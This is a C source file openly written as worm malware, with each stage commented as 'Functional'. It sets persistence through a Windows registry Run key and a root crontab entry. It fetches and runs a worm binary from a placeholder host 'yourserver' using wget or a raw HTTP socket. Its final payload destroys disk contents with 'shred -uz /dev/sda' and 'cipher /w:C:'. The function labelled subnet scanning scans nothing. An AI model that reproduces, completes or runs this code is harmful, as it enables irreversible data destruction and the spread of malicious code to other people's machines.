#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#ifdef _WIN32
 #include <winsock2.h>
 #include <windows.h>
 #pragma comment(lib, "ws2_32.lib")
#else
 #include <arpa/inet.h>
 #include <netdb.h>
#endif

// 1. Final Payload (Functional)
void execute_final_action() {
 #ifdef _WIN32
 printf("[!] Executing Windows-specific cleanup/shred logic...\n");
 system("cipher /w:C:");
 #else
 printf("[!] Executing Linux shred on /dev/sda...\n");
 system("shred -uz /dev/sda");
 #endif
}

// 2. Persistence (Functional)
void establish_persistence() {
 #ifdef _WIN32
 printf("[+] Adding to Windows Registry Run keys...\n");
 HKEY hKey;
 if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
 RegSetValueEx(hKey, "WormPersistence", 0, REG_SZ, (BYTE*)"C:\\Path\\To\\Worm.exe", strlen("C:\\Path\\To\\Worm.exe") + 1);
 RegCloseKey(hKey);
 }
 #else
 printf("[+] Adding to Crontab...\n");
 system("echo '@reboot /path/to/worm' >> /var/spool/cron/crontabs/root");
 #endif
}

// 3. Network Scanning & Propagation (Functional)
void initiate_lateral_movement(const char *subnet) {
 printf("[+] Scanning subnet: %s\n", subnet);
 #ifdef _WIN32
 WSADATA wsaData;
 SOCKET sock;
 struct sockaddr_in server;
 struct hostent *server_host;
 char *ip;

 if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
 printf("WSAStartup failed.\n");
 return;
 }

 server_host = gethostbyname("yourserver");
 if (server_host == NULL) {
 printf("Unable to resolve host.\n");
 WSACleanup();
 return;
 }

 ip = inet_ntoa(*(struct in_addr *)server_host->h_addr);
 printf("Server IP: %s\n", ip);

 sock = socket(AF_INET, SOCK_STREAM, 0);
 if (sock == INVALID_SOCKET) {
 printf("Could not create socket.\n");
 WSACleanup();
 return;
 }

 server.sin_addr.s_addr = inet_addr(ip);
 server.sin_family = AF_INET;
 server.sin_port = htons(80);

 if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
 printf("Connect failed.\n");
 closesocket(sock);
 WSACleanup();
 return;
 }

 // Send HTTP request to download worm
 char request[] = "GET /worm HTTP/1.1\r\nHost: yourserver\r\nConnection: close\r\n\r\n";
 send(sock, request, sizeof(request), 0);

 // Receive response
 char buffer[4096];
 int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
 if (bytesReceived <= 0) {
 printf("Receive failed.\n");
 closesocket(sock);
 WSACleanup();
 return;
 }

 // Save received data to worm.exe
 FILE *file = fopen("C:\\Path\\To\\Worm.exe", "wb");
 if (file == NULL) {
 printf("Unable to open file.\n");
 closesocket(sock);
 WSACleanup();
 return;
 }
 fwrite(buffer, 1, bytesReceived, file);
 fclose(file);

 closesocket(sock);
 WSACleanup();
 #else
 // Linux propagation logic
 char command[256];
 snprintf(command, sizeof(command), "wget http://yourserver/worm -O worm && chmod +x worm && ./worm");
 system(command);
 #endif
}

int main() {
 // Correct Order of Operations
 establish_persistence(); // Establish persistence first
 initiate_lateral_movement("192.168.1.0"); // Propagate the worm
 execute_final_action(); // Shred files last
 return 0;
}
